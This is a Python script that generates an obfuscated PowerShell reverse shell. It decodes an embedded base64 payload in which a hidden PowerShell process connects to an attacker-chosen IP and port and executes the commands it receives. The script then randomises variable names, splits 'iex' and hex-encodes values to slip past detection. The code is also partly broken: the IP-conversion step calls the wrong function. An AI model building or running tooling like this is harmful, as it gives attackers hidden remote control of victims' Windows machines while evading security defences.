import re
import string
import random
import base64

# Accept user input for IP and port
ip = input("Enter IP address: ")
port = input("Enter port: ")
b64string = "U3RhcnQtUHJvY2VzcyAkUFNIT01FXHBvd2Vyc2hlbGwuZXhlIC1Bcmd1bWVudExpc3QgeyRjbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5UQ1BDbGllbnQoJypMSE9TVConLCpMUE9SVCopOyRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpO1tieXRlW11dJGJ5dGVzID0gMC4uNjU1MzV8JXswfTt3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKSkgLW5lIDApezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiA9ICRzZW5kYmFjayArICdQUyAnICsgKHB3ZCkuUGF0aCArICc+ICc7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfTskY2xpZW50LkNsb3NlKCl9IC1XaW5kb3dTdHlsZSBIaWRkZW4K"
decoded = str(base64.b64decode(b64string))
script = (decoded)

# Open script.ps1 file in read mode
#with open(file, 'r') as f:
#    script = f.read()

# Replace all variables with random 10-character names - excluding $PSHOME
var_dict = {}
pattern = re.compile(r'(?!\$PSHOME)(\$[A-Za-z0-9]+)')

def replace_var(match):
    var_name = match.group(1)
    if var_name not in var_dict:
        var_dict[var_name] = f'${"".join(random.choices(string.ascii_letters + string.digits, k=10))}'
    return var_dict[var_name]

script = pattern.sub(replace_var, script)

# Replace iex with i''ex
pattern = re.compile(r'iex')
script = pattern.sub("i''ex", script)

# Replace PS with <:Random uuid):>
pattern = re.compile(r'\bPS\b')

def replace_ps(match):
    return f'<:{"".join(random.choices(string.ascii_letters + string.digits, k=10))}:>'

script = pattern.sub(replace_ps, script)

# Replace IP and port in script
script = script.replace("'*LHOST*',*LPORT*", f"'{ip}',{port}")

# Convert IP addresses to hex
pattern = re.compile(r'\b(?:\d{1,3}\.){3}\d{1,3}\b')

def ip_to_hex(match):
    return '0x' + ''.join(f'{int(x):02x}' for x in match.group(0).split('.'))
script = pattern.sub(replace_ps, script)

# Convert Port Number to hex - Not matching 65535
pattern = re.compile(r'\b(?!65535)([1-9]\d{1,3}|[1-5]\d{4}|6[0-4]\d{3}|65[0-4]\d{2}|655[0-2]\d|6553[0-5])\b')

def port_to_hex(match):
        port_number = int(match.group())
        hex_value = hex(port_number)
        return hex_value

script = str(pattern.sub(port_to_hex, script))

# Print modified script to console
print(script[1::])

